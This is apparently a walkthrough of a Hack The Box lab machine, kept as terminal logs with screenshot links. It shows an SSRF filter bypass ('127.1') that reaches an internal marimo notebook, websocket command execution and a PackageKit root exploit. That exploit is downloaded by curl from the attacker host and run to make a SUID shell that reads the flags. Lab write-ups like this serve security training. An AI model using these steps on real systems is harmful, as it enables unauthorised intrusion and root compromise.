
![[Pasted image 20260906014155.png]]



![[Pasted image 20260905223422.png]]


```
nmap -sV -sC -p22,80,443 10.129.35.110
Starting Nmap 7.99 ( https://nmap.org ) at 2026-09-05 12:32 -0400
Nmap scan report for 10.129.35.110
Host is up (0.057s latency).

PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.18 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp  open  http     nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to https://cohort.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
443/tcp open  ssl/http nginx 1.24.0 (Ubuntu)
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|   http/1.1
|   http/1.0
|_  http/0.9
| ssl-cert: Subject: commonName=cohort.htb/organizationName=Cohort Analytics
| Subject Alternative Name: DNS:cohort.htb, DNS:*.cohort.htb
| Not valid before: 2026-06-01T18:47:07
|_Not valid after:  2126-05-08T18:47:07
|_http-title: Did not follow redirect to https://cohort.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.60 seconds

```



![[Pasted image 20260906000135.png]]


![[Pasted image 20260906000222.png]]


```
(root㉿kali)-[/home/kali/Desktop/HTB]
└─# curl -s -k -X POST https://cohort.htb/api/validate -H "Content-Type: aplication/json" -d ' {"url":"https://127.0.0.1/","format": "csv"}'
{"ok": false, "message": "Internal or loopback addresses are not permitted."}                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# curl -s -k -X POST https://cohort.htb/api/validate -H "Content-Type: aplication/json" -d ' {"url":"https://127.1/","format": "csv"}' 
{"ok": true, "fetched_status": 200, "content_type": "text/html", "preview": "<!doctype html>\n<html lang=\"en\">\n<head>\n<meta charset=\"utf-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n<title>Cohort Analytics</title>\n<meta name=\"description\" content=\"Cohort Analytics - retention intelligence for subscription teams.\">\n<link rel=\"stylesheet\" href=\"/assets/styles.css\">\n</head>\n<body>\n<div id=\"app\" data-page=\"home\" aria-busy=\"true\">\n  <div class=\"boot\"><span class=\"boot-mark\" aria-hidden=\"true\"></span><span>Loading Cohort Analytics</span></div>\n</div>\n<noscript>\n  <div style=\"max-width:640px;margin:18vh auto;padding:0 24px;font-family:system-ui,sans-serif;color:#15181d;text-align:center;\">\n    <h1 style=\"font-size:1.4rem;\">JavaScript required</h1>\n    <p style=\"color:#4a5159;\">The Cohort Analytics workspace runs in your browser. Please enable JavaScript to continue.</p>\n  </div>\n</noscript>\n<script src=\"/assets/app.js\" defer></script>\n</body>\n</html>\n", "message": "Source reachable."}                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# curl -s -k -X POST https://cohort.htb/api/validate -H "Content-Type: aplication/json" -d ' {"url":"https://127.1:5000/","format": "csv"}'
{"ok": false, "message": "Could not reach the source: [SSL: WRONG_VERSION_NUMBER] wrong version number (_ssl.c:1000)"}                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# curl -s -k -X POST https://cohort.htb/api/validate -H "Content-Type: aplication/json" -d ' {"url":"https://127.1:5001/","format": "csv"}'
{"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# curl -s -k -X POST https://cohort.htb/api/validate -H "Content-Type: aplication/json" -d ' {"url":"https://127.1:9001/","format": "csv"}' 
{"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# curl -s -k -X POST https://cohort.htb/api/validate -H "Content-Type: aplication/json" -d ' {"url":"http://127.1:9001/","format": "csv"}' 
{"ok": false, "message": "Could not reach the source: [Errno 111] Connection refused"}                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# curl -s -k -X POST https://cohort.htb/api/validate -H "Content-Type: aplication/json" -d ' {"url":"http://127.1:5000/","format": "csv"}'
{"ok": true, "fetched_status": 405, "content_type": "application/json", "preview": "{\"ok\": false, \"message\": \"Method not allowed.\"}", "message": "Source responded with an error status."}                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# curl -s -k -X POST https://cohort.htb/api/validate -H "Content-Type: aplication/json" -d ' {"url":"http://127.1:8888/","format": "csv"}'
{"ok": true, "fetched_status": 200, "content_type": "text/html; charset=utf-8", "preview": "\n<!DOCTYPE html>\n<html lang=\"en\">\n<head>\n<meta charset=\"UTF-8\">\n<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">\n<title>marimo</title>\n</head>\n<body style=\"\n    background-color: #f4f4f9;\n    display: flex;\n    justify-content: center;\n    align-items: center;\n    height: 100vh;\n    margin: 0;\">\n  <form method=\"POST\" action=\"/auth/login\" style=\"\n    padding: 20px;\n    background-color: white;\n    border-radius: 8px;\n    box-shadow: 0 4px 8px rgba(0,0,0,0.1);\n    width: 300px;\n    text-align: center;\">\n    <div style=\"margin-bottom: 20px;\">\n      <label for=\"password\" style=\"\n        display: block;\n        margin-bottom: 5px;\n        font-size: 16px;\n        font-family: Arial, sans-serif;\n        color: #333;\">Access Token / Password</label>\n      <input id=\"password\" name=\"password\" type=\"password\" style=\"\n        width: 100%;\n        box-sizing: border-box;\n        padding: 8px;\n        border: 1px solid #ccc;\n        border-radius: 4px;\">\n    </div>\n    <button type=\"submit\" style=\"\n        background-color: #1C7362;\n        color: white;\n        padding: 10px 20px;\n        border: none;\n        border-radius: 4px;\n        cursor: pointer;\n        width: 100%;\n        font-size: 16px;\">Login</button>\n    <p style=\"color: red;\"></p>\n  </form>\n</body>\n</html>\n", "message": "Source reachable."}                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# curl -s -k -X POST https://cohort.htb/api/validate -H "Content-Type: aplication/json" -d ' {"url":"http://127.1/status","format": "csv"}' 
{"ok": true, "fetched_status": 200, "content_type": "application/json", "preview": "{\"service\":\"cohort-edge\",\"status\":\"ok\",\"generated_by\":\"nginx\",\"upstreams\":[{\"name\":\"marketing\",\"host\":\"cohort.htb\",\"root\":\"/var/www/cohort\"},{\"name\":\"insights-api\",\"host\":\"cohort.htb\",\"path\":\"/api/\",\"target\":\"127.0.0.1:5000\"},{\"name\":\"notebooks\",\"host\":\"nb-1be3782a8afd3ad5.cohort.htb\",\"target\":\"127.0.0.1:8888\",\"note\":\"internal analyst workspace, not for external use\"}]}", "message": "Source reachable."}                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# 

```


![[Pasted image 20260906001510.png]]


![[Pasted image 20260906001611.png]]


```
                                                                                                                                                           
┌──(root㉿kali)-[/home/kali/Desktop/HTB]
└─# cd cohort                                                                                                                                
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/cohort]
└─# nano exploit.py
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/cohort]
└─# ls
exploit.py
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/cohort]
└─# ls -la
total 12
drwxrwxr-x  2 root root 4096 Sep  5 14:17 .
drwxr-xr-x 21 root root 4096 Sep  5 12:27 ..
-rw-rw-r--  1 root root 2748 Sep  5 14:17 exploit.py
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/cohort]
└─# chmod +x exploit.py 
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/cohort]
└─# python3 exploit.py                                     
[+] Handshake response:
HTTP/1.1 101 Switching Protocols
Server: nginx/1.24.0 (Ubuntu)
Date: Sat, 05 Sep 2026 18:17:27 GMT
Connection: upgrade
Upgrade: websocket
Sec-WebSocket-Accept: sELTNOxNrKYPoS4W4HP23PqyccQ=


marimo@cohort:~$ 3ϟ
id; whoami; hostname
uid=1000(marimo) gid=1000(marimo) groups=1000(marimo)
marimo
cohort
marimo@cohort:~$ 
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/cohort]
└─# python3 exploit.py "cat /home/marimo/user.txt"         
[+] Handshake response:
HTTP/1.1 101 Switching Protocols
Server: nginx/1.24.0 (Ubuntu)
Date: Sat, 05 Sep 2026 18:18:51 GMT
Connection: upgrade
Upgrade: websocket
Sec-WebSocket-Accept: orkkFhb0D8V7sfX63fTt0jy5OP4=


marimo@cohort:~$ {#
cat /home/marimo/user.txt
bdfbc8b0343f591fcf9986bbcb3902ca
marimo@cohort:~$ 

```


```
─(root㉿kali)-[/home/kali/Desktop/HTB/cohort]
└─# python3 exploit.py "dpkg -l | grep -i packagekit; which dpkg-deb; dbus-send --version"
[+] Handshake response:
HTTP/1.1 101 Switching Protocols
Server: nginx/1.24.0 (Ubuntu)
Date: Sat, 05 Sep 2026 19:08:00 GMT
Connection: upgrade
Upgrade: websocket
Sec-WebSocket-Accept: UqQDCdVyuTuPvGaIhBdV8ZqZmAY=


marimo@cohort:~$ /z��
dpkg -l | grep -i packagekit; which dpkg-deb; dbus-send --version
ii  gir1.2-packagekitglib-1.0             1.2.8-2ubuntu1.5                                 amd64        GObject introspection data for the PackageKit GLib library
ii  libpackagekit-glib2-18:amd64          1.2.8-2ubuntu1.5                                 amd64        Library for accessing PackageKit using GLib
hi  packagekit                            1.2.8-2ubuntu1.2                                 amd64        Provides a package management service
ii  packagekit-tools                      1.2.8-2ubuntu1.2                                 amd64        Provides PackageKit command-line tools
/usr/bin/dpkg-deb
Usage: dbus-send [--help] [--system | --session | --bus=ADDRESS | --peer=ADDRESS] [--sender=NAME] [--dest=NAME] [--type=TYPE] [--print-reply[=literal]] [--reply-timeout=MSEC] <destination object path> <message name> [contents ...]
marimo@cohort:~$ 
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/cohort]
└─# python3 exploit.py "sudo -l 2>&1; id; cat/etc/os-release; uname -a"                   
[+] Handshake response:
HTTP/1.1 101 Switching Protocols
Server: nginx/1.24.0 (Ubuntu)
Date: Sat, 05 Sep 2026 19:10:59 GMT
Connection: upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 8tg8yHRaVbZy2OhgesJFx+9zAeM=


marimo@cohort:~$ г��
sudo -l 2>&1; id; cat/etc/os-release; uname -a
[sudo] password for marimo: 
                                
```


```
                                                                                                                                                           
┌──(root㉿kali)-[/home/kali/Desktop/HTB/cohort]
└─# git clone https://github.com/shibaaa204/Pack2TheRoot.git
Cloning into 'Pack2TheRoot'...
remote: Enumerating objects: 9, done.
remote: Counting objects: 100% (9/9), done.
remote: Compressing objects: 100% (9/9), done.
remote: Total 9 (delta 0), reused 9 (delta 0), pack-reused 0 (from 0)
Receiving objects: 100% (9/9), 656.82 KiB | 1.22 MiB/s, done.
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/cohort]
└─# la
exploit.py  Pack2TheRoot
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/cohort]
└─# cd Pack2TheRoot 
                                                                                                                                                             
┌──(root㉿kali)-[/home/…/Desktop/HTB/cohort/Pack2TheRoot]
└─# ls
Dockerfile  entrypoint.sh  exploit.bin  exploit.c  exploit.py  packagekit_1.3.1-1_amd64.deb  README.md
                                                                                                                                                             
┌──(root㉿kali)-[/home/…/Desktop/HTB/cohort/Pack2TheRoot]
└─# python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.35.110 - - [05/Sep/2026 15:29:11] "GET /exploit.bin HTTP/1.1" 200 -


```


```
                                                                                                                                                            
┌──(root㉿kali)-[/home/kali/Desktop/HTB/cohort]
└─# python3 exploit.py "curl -s -o /tmp/exploit.bin http://10.10.14.181:8000/exploit.bin && chmod +x /tmp/exploit.bin && ls -la /tmp/exploit.bin" 
[+] Handshake response:
HTTP/1.1 101 Switching Protocols
Server: nginx/1.24.0 (Ubuntu)
Date: Sat, 05 Sep 2026 19:28:25 GMT
Connection: upgrade
Upgrade: websocket
Sec-WebSocket-Accept: un28Q316P366MIy6jQRuS9ezswY=


marimo@cohort:~$ S���
curl -s -o /tmp/exploit.bin http://10.10.14.181:8000/exploit.bin && chmod +x /tmp/exploit.bin && ls -la /tmp/exploit.bin
-rwxr-xr-x 1 marimo marimo 17280 Sep  5 19:28 /tmp/exploit.bin
marimo@cohort:~$ 
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/cohort]
└─# python3 exploit.py "rm -f /tmp/.suid_bash /tmp/pk.log; nohup /tmp/exploit.bin > /tmp/pk.log 2>&1 & sleep 1; echo started"                    
[+] Handshake response:
HTTP/1.1 101 Switching Protocols
Server: nginx/1.24.0 (Ubuntu)
Date: Sat, 05 Sep 2026 19:29:56 GMT
Connection: upgrade
Upgrade: websocket
Sec-WebSocket-Accept: 6DKtgVYhBWNqWRyVBHvExq/nOug=


marimo@cohort:~$ ��I
rm -f /tmp/.suid_bash /tmp/pk.log; nohup /tmp/exploit.bin > /tmp/pk.log 2>&1 & sleep 1; echo started
[1] 2345
started
marimo@cohort:~$ 
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/cohort]
└─# python3 exploit.py "cat /tmp/pk.log; echo ---; stat /tmp/.suid_bash 2>&1"                                                
[+] Handshake response:
HTTP/1.1 101 Switching Protocols
Server: nginx/1.24.0 (Ubuntu)
Date: Sat, 05 Sep 2026 19:30:28 GMT
Connection: upgrade
Upgrade: websocket
Sec-WebSocket-Accept: yfUt02Unmrt9dAVN+KEpbfZbamo=


marimo@cohort:~$ �1t�
cat /tmp/pk.log; echo ---; stat /tmp/.suid_bash 2>&1
nohup: ignoring input
[*] CVE-2026-41651 — PackageKit LPE (Refined)
[+] TxID: /2_decabbdb
[*] Racing: SIMULATE -> REAL...
[*] Polling for /tmp/.suid_bash (60s)...
../tmp/.suid_bash: error reading input file: Bad file descriptor
---
  File: /tmp/.suid_bash
  Size: 1446024         Blocks: 2832       IO Block: 4096   regular file
Device: 8,4     Inode: 92752       Links: 1
Access: (4755/-rwsr-xr-x)  Uid: (    0/    root)   Gid: (    0/    root)
Access: 2026-09-05 19:30:02.042962847 +0000
Modify: 2026-09-05 19:30:01.286962832 +0000
Change: 2026-09-05 19:30:01.287962832 +0000
 Birth: 2026-09-05 19:30:01.285962832 +0000
marimo@cohort:~$ 
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/cohort]
└─# python3 exploit.py "/tmp/.suid_bash -p -c 'id; cat /root/root.txt'"      
[+] Handshake response:
HTTP/1.1 101 Switching Protocols
Server: nginx/1.24.0 (Ubuntu)
Date: Sat, 05 Sep 2026 19:30:47 GMT
Connection: upgrade
Upgrade: websocket
Sec-WebSocket-Accept: taX+5cWSexS5+RlumkirHUdktsw=


marimo@cohort:~$ a#��
/tmp/.suid_bash -p -c 'id; cat /root/root.txt'
uid=1000(marimo) gid=1000(marimo) euid=0(root) groups=1000(marimo)
0ded0026047dd634ecafa07263606f4a
marimo@cohort:~$ 
                                                                                                                                                             
┌──(root㉿kali)-[/home/kali/Desktop/HTB/cohort]
└─# 

```


![[Pasted image 20260906014114.png]]